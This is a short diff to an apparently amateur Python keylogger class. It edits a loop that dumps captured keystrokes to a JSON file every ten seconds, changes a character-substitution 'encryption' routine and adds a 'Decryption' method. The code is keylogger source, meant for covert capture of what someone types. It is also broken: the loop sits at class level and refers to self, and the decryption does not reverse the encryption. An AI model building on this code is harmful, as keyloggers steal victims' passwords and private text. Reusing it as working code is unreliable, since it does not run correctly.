@@ -43,19 +43,30 @@ class KeyLogger:
             with open("my_keylogger.json","w") as f:
                 json.dump(self.logger, f, indent=4)
                 self.logger = ""
-    while True:
-        time.sleep(10)
-        write_of_file(self.logger)
 
 
     def encryption(self):
         array_encryption = ""
         for word in self.logger:
             nem = ord(word)+2
-            nem = (nem ** 2)//65
+            nem = (nem ** 2)
             if nem > 122:
                 nem -= 57
             array_encryption += (chr(nem))
         return array_encryption
+
+    def Decryption(self,logger):
+        array_encryption = ""
+        for word in logger:
+            nem = ord(word)
+            if nem + 57 > 122:
+                nem += 57
+            nem **= 0.5
+            nem -= 2
+            array_encryption += (chr(int(nem)))
+        return array_encryption
+    while True:
+        time.sleep(10)
+        write_of_file(self.logger)
 
 
